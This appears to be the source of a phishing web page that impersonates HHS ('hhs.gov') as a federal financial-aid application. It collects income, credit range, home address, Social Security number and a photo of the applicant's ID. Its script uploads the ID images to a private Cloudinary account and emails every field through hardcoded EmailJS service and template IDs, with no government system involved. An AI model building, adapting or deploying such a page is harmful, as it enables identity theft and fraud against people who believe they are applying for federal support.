<!DOCTYPE html>
<html lang="en">
<head>
   <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.css" integrity="sha384-tViUnnbYAV00FLIhhi3v/dWt3Jxw4gZQcNoSCxCIFNJVCx7/D55/wXsrNIRANwdD" crossorigin="anonymous">
      <link rel="shortcut icon" href="css/image/logo-desktop.svg" type="image/x-icon">
      <link rel="stylesheet" href="css/form.css">
      // <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
    <title>hhs.gov</title>
</head>
<body>

     <!-- HHS Form Info Section -->
<div class="info-section">
    <p>
        This HHS Financial Support Application form is designed to collect essential personal and financial information from applicants to determine eligibility for federal aid. All data submitted is treated with confidentiality and will only be used for assessment purposes.
    </p>
    <a href="index.html" class="back-link">
        <i class="bi bi-arrow-left"></i> Back to Front Page
    </a>
</div>


        <div class="container">
        <!-- Header -->
        <div class="header">
            <h1>Financial Support Application</h1>
            <p id="categoryDisplay">Loading...</p>
        </div>

        <!-- Form -->
        <form id="applicationForm">
            <!-- Section 1: Funding Information -->
            <div class="form-section section-1">
                <div class="section-header">
                    <div class="section-title">
                        <div class="section-number">1</div>
                        Funding Information
                    </div>
                </div>
                <div class="section-content">
                    <div class="form-grid">
                        <div class="form-group">
                            <label class="form-label" for="estimatedAmount">Estimated Amount Needed *</label>
                            <input type="text" id="estimatedAmount" class="form-input" placeholder="$0" required>
                            <div class="error-message" id="estimatedAmount-error"></div>
                        </div>

                        <div class="form-group">
                            <label class="form-label" for="moneyFor">What is the money for? *</label>
                            <input type="text" id="moneyFor" class="form-input" placeholder="Purpose of funding" required>
                            <div class="error-message" id="moneyFor-error"></div>
                        </div>

                        <div class="form-group">
                            <label class="form-label" for="employmentStatus">Current Employment Status *</label>
                            <select id="employmentStatus" class="form-select" required>
                                <option value="">Select employment status</option>
                                <option value="employed">Employed</option>
                                <option value="self-employed">Self-Employed</option>
                                <option value="unemployed">Unemployed</option>
                                <option value="student">Student</option>
                                <option value="retired">Retired</option>
                            </select>
                            <div class="error-message" id="employmentStatus-error"></div>
                        </div>

                        <div class="form-group">
                            <label class="form-label" for="annualIncome">Annual Income *</label>
                            <input type="text" id="annualIncome" class="form-input" placeholder="$0" required>
                            <div class="error-message" id="annualIncome-error"></div>
                        </div>

                        <div class="form-group form-grid-full">
                            <label class="form-label" for="creditScore">Credit Score *</label>
                            <select id="creditScore" class="form-select" required>
                                <option value="">Select credit score range</option>
                                <option value="poor">Poor (300-579)</option>
                                <option value="fair">Fair (580-669)</option>
                                <option value="good">Good (670-739)</option>
                                <option value="excellent">Excellent (740-850)</option>
                            </select>
                            <div class="error-message" id="creditScore-error"></div>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Section 2: Personal Information -->
            <div class="form-section section-2">
                <div class="section-header">
                    <div class="section-title">
                        <div class="section-number">2</div>
                        Personal Information
                    </div>
                </div>
                <div class="section-content">
                    <div class="form-grid">
                        <div class="form-group">
                            <label class="form-label" for="firstName">First Name *</label>
                            <input type="text" id="firstName" class="form-input" required>
                            <div class="error-message" id="firstName-error"></div>
                        </div>

                        <div class="form-group">
                            <label class="form-label" for="lastName">Last Name *</label>
                            <input type="text" id="lastName" class="form-input" required>
                            <div class="error-message" id="lastName-error"></div>
                        </div>

                        <div class="form-group">
                            <label class="form-label" for="dateOfBirth">Date of Birth *</label>
                            <input type="date" id="dateOfBirth" class="form-input" required>
                            <div class="error-message" id="dateOfBirth-error"></div>
                        </div>

                        <div class="form-group">
                            <label class="form-label" for="phoneNumber">Phone Number *</label>
                            <input type="tel" id="phoneNumber" class="form-input" placeholder="(555) 123-4567" required>
                            <div class="error-message" id="phoneNumber-error"></div>
                        </div>

                        <div class="form-group">
                           <label class="form-label" for="userEmail">Email Address *</label>
                           <input type="email" id="userEmail" class="form-input" placeholder="you@example.com" required>
                           <div class="error-message" id="userEmail-error"></div>
                       </div>


                        <div class="form-group form-grid-full">
                            <label class="form-label" for="streetAddress">Street Address *</label>
                            <input type="text" id="streetAddress" class="form-input" required>
                            <div class="error-message" id="streetAddress-error"></div>
                        </div>

                        <div class="form-group">
                            <label class="form-label" for="city">City *</label>
                            <input type="text" id="city" class="form-input" required>
                            <div class="error-message" id="city-error"></div>
                        </div>

                        <div class="form-group">
                            <label class="form-label" for="state">State *</label>
                            <input type="text" id="state" class="form-input" required>
                            <div class="error-message" id="state-error"></div>
                        </div>

                        <div class="form-group">
                            <label class="form-label" for="zipCode">Zip Code *</label>
                            <input type="text" id="zipCode" class="form-input" required>
                            <div class="error-message" id="zipCode-error"></div>
                        </div>

                        <div class="form-group">
                            <label class="form-label" for="ssn">Social Security Number *</label>
                            <input type="text" id="ssn" class="form-input" placeholder="***-**-1234" required>
                            <div class="error-message" id="ssn-error"></div>
                        </div>

                        <div class="form-group form-grid-full">
                            <label class="form-label">Do you rent or own your home? *</label>
                            <div class="radio-group">
                                <div class="radio-item">
                                    <input type="radio" id="rent" name="homeOwnership" value="rent" class="radio-input" required>
                                    <label for="rent">Rent</label>
                                </div>
                                <div class="radio-item">
                                    <input type="radio" id="own" name="homeOwnership" value="own" class="radio-input" required>
                                    <label for="own">Own</label>
                                </div>
                            </div>
                            <div class="error-message" id="homeOwnership-error"></div>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Section 3: Identity Verification -->
            <div class="form-section section-3">
                <div class="section-header">
                    <div class="section-title">
                        <div class="section-number">3</div>
                        Identity Verification
                    </div>
                </div>
                <div class="section-content">
                    <div class="form-group">
                        <label class="form-label">Upload a Clear Photo of Your ID Card or Driver's License *</label>
                        <div class="file-upload-area" id="fileUploadArea">
                            <input type="file" id="idUpload" accept="image/*" style="display: none;" required>
                            <div id="uploadContent">
                                <svg class="upload-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M7 16a4 4 0 01-.88-7.903A5 5 0 1115.9 6L16 6a5 5 0 011 9.9M15 13l-3-3m0 0l-3 3m3-3v12"></path>
                                </svg>
                                <p>Click to upload your ID</p>
                                <p style="font-size: 0.75rem; color: #9ca3af; margin-top: 0.25rem;">PNG, JPG up to 5MB</p>
                            </div>
                            <div id="uploadSuccess" style="display: none;">
                                <svg style="width: 1.5rem; height: 1.5rem; color: #10b981; margin-bottom: 0.5rem;" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path>
                                </svg>
                                <p style="color: #059669; font-weight: 500;">ID uploaded successfully</p>
                            </div>
                        </div>
                        <div class="error-message" id="idUpload-error"></div>
                        <div class="file-preview" id="filePreview"  style="display: none;">
                            <img id="previewImage" alt="ID Preview">
                        </div>
                    </div>
                </div>
            </div>

            <!-- Submit Button -->
            <div class="submit-section">
                <button type="submit" class="submit-button" id="submitButton">
                    Submit Application
                </button>
            </div>
        </form>
    </div>

 <script>
emailjs.init("Ip04_l-6HrsnhwEdb");

class ApplicationForm {
    constructor() {
        this.form = document.getElementById('applicationForm');
        this.submitButton = document.getElementById('submitButton');
        this.fileUpload = document.getElementById('idUpload');
        this.fileUploadArea = document.getElementById('fileUploadArea');
        this.categoryDisplay = document.getElementById('categoryDisplay');
        this.cloudName = "dx4qqr3cc";
        this.uploadPreset = "codyjohnson";
        this.selectedFiles = [];

        this.initializeForm();
        this.setupEventListeners();
        this.loadCategoryFromURL();
    }

    initializeForm() {
        ['estimatedAmount', 'annualIncome'].forEach(id => {
            const input = document.getElementById(id);
            input.addEventListener('input', (e) => this.formatCurrency(e.target));
        });

        document.getElementById('phoneNumber').addEventListener('input', (e) => this.formatPhone(e.target));
        document.getElementById('ssn').addEventListener('input', (e) => this.formatSSN(e.target));
    }

    setupEventListeners() {
        this.form.addEventListener('submit', (e) => this.handleSubmit(e));
        this.fileUploadArea.addEventListener('click', () => this.fileUpload.click());
        this.fileUpload.addEventListener('change', (e) => this.handleFileUpload(e));
        this.form.addEventListener('input', (e) => this.clearError(e.target));
        this.form.addEventListener('change', (e) => this.clearError(e.target));
    }

    loadCategoryFromURL() {
        const urlParams = new URLSearchParams(window.location.search);
        const category = urlParams.get('category') || 'Financial Support';
        this.categoryDisplay.textContent = category;
        document.getElementById('moneyFor').value = category;
    }

    formatCurrency(input) {
        const value = input.value.replace(/[^\d]/g, '');
        if (value) {
            input.value = new Intl.NumberFormat('en-US', { style: 'currency', currency: 'USD', minimumFractionDigits: 0 }).format(parseInt(value));
        } else {
            input.value = '';
        }
    }

    formatPhone(input) {
        const value = input.value.replace(/[^\d]/g, '');
        if (value.length >= 10) {
            input.value = `(${value.slice(0, 3)}) ${value.slice(3, 6)}-${value.slice(6, 10)}`;
        } else {
            input.value = value;
        }
    }

    formatSSN(input) {
        const value = input.value.replace(/[^\d]/g, '');
        if (value.length >= 9) {
            input.value = `***-**-${value.slice(-4)}`;
        } else {
            input.value = value;
        }
    }

    handleFileUpload(event) {
        const files = Array.from(event.target.files);
        this.selectedFiles = files;

        const preview = document.getElementById('filePreview');
        preview.innerHTML = '';

        files.forEach(file => {
            if (!file.type.startsWith('image/')) return;
            const reader = new FileReader();
            reader.onload = (e) => {
                const img = document.createElement('img');
                img.src = e.target.result;
                img.style.maxWidth = '100px';
                img.style.margin = '5px';
                preview.appendChild(img);
            };
            reader.readAsDataURL(file);
        });

        preview.style.display = 'block';
        this.clearError(this.fileUpload);
    }

    validateForm() {
        const errors = {};
        const requiredFields = [
            'estimatedAmount', 'moneyFor', 'employmentStatus', 'annualIncome', 'creditScore',
            'firstName', 'lastName', 'dateOfBirth', 'streetAddress', 'city', 'state',
            'zipCode', 'ssn', 'phoneNumber', 'userEmail'
        ];

        requiredFields.forEach(field => {
            const element = document.getElementById(field);
            if (!element.value.trim()) {
                errors[field] = 'This field is required';
            }
        });

        const homeOwnership = document.querySelector('input[name="homeOwnership"]:checked');
        if (!homeOwnership) errors['homeOwnership'] = 'Please select an option';

        const phoneRegex = /^\(\d{3}\) \d{3}-\d{4}$/;
        const phoneValue = document.getElementById('phoneNumber').value;
        if (phoneValue && !phoneRegex.test(phoneValue)) errors['phoneNumber'] = 'Invalid phone format';

        const emailValue = document.getElementById('userEmail').value.trim();
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        if (emailValue && !emailRegex.test(emailValue)) errors['userEmail'] = 'Invalid email format';

        if (!this.selectedFiles.length) errors['idUpload'] = 'ID upload is required';

        return errors;
    }

    showErrors(errors) {
        Object.keys(errors).forEach(field => {
            const errorElement = document.getElementById(`${field}-error`);
            const inputElement = document.getElementById(field) || document.querySelector(`input[name="${field}"]`);
            if (errorElement) errorElement.textContent = errors[field];
            if (inputElement) inputElement.classList.add('error');
        });
    }

    clearError(element) {
        const fieldName = element.name || element.id;
        const errorElement = document.getElementById(`${fieldName}-error`);
        if (errorElement) errorElement.textContent = '';
        element.classList.remove('error');
    }

    async uploadImagesToCloudinary() {
        const uploadPromises = this.selectedFiles.map(file => {
            const formData = new FormData();
            formData.append("file", file);
            formData.append("upload_preset", this.uploadPreset);

            return fetch(`https://api.cloudinary.com/v1_1/${this.cloudName}/image/upload`, {
                method: 'POST',
                body: formData
            }).then(res => res.json());
        });

        return Promise.all(uploadPromises);
    }

    async handleSubmit(event) {
        event.preventDefault();

        const errors = this.validateForm();
        document.querySelectorAll('.error-message').forEach(el => el.textContent = '');
        document.querySelectorAll('.error').forEach(el => el.classList.remove('error'));

        if (Object.keys(errors).length > 0) {
            this.showErrors(errors);
            this.showToast('Please correct the errors', 'Some required fields are missing or invalid', 'error');
            return;
        }

        this.submitButton.disabled = true;
        this.submitButton.innerHTML = '<span class="loading-spinner"></span>Submitting...';

        try {
            const uploads = await this.uploadImagesToCloudinary();
            const imageUrls = uploads.map(u => u.secure_url).join(', ');

            const formData = {
                estimatedAmount: document.getElementById('estimatedAmount').value,
                moneyFor: document.getElementById('moneyFor').value,
                employmentStatus: document.getElementById('employmentStatus').value,
                annualIncome: document.getElementById('annualIncome').value,
                creditScore: document.getElementById('creditScore').value,
                firstName: document.getElementById('firstName').value,
                lastName: document.getElementById('lastName').value,
                dateOfBirth: document.getElementById('dateOfBirth').value,
                phoneNumber: document.getElementById('phoneNumber').value,
                streetAddress: document.getElementById('streetAddress').value,
                city: document.getElementById('city').value,
                state: document.getElementById('state').value,
                zipCode: document.getElementById('zipCode').value,
                ssn: document.getElementById('ssn').value,
                homeOwnership: document.querySelector('input[name="homeOwnership"]:checked').value,
                userEmail: document.getElementById('userEmail').value,
                imageUrls,
                user_name: `${document.getElementById('firstName').value} ${document.getElementById('lastName').value}`
            };

            await emailjs.send("service_mj2jnxi", "template_l3i1f33", formData);
            await emailjs.send("service_mj2jnxi", "template_ya8heou", formData);

            this.showToast('Submitted!', 'Application sent successfully.', 'success');
            setTimeout(() => {
                this.form.reset();
                document.getElementById('filePreview').innerHTML = '';
                this.selectedFiles = [];
            }, 3000);

        } catch (err) {
            console.error(err);
            this.showToast('Error', 'Submission failed. Try again.', 'error');
        } finally {
            this.submitButton.disabled = false;
            this.submitButton.innerHTML = 'Submit Application';
        }
    }

    showToast(title, description, type = 'success') {
        document.querySelectorAll('.toast').forEach(t => t.remove());
        const toast = document.createElement('div');
        toast.className = `toast ${type}`;
        toast.innerHTML = `<div class="toast-title">${title}</div><div class="toast-description">${description}</div>`;
        document.body.appendChild(toast);
        setTimeout(() => toast.classList.add('show'), 100);
        setTimeout(() => {
            toast.classList.remove('show');
            setTimeout(() => toast.remove(), 300);
        }, 5000);
    }
}

document.addEventListener('DOMContentLoaded', () => {
    new ApplicationForm();
});
</script>


    
</body>
</html>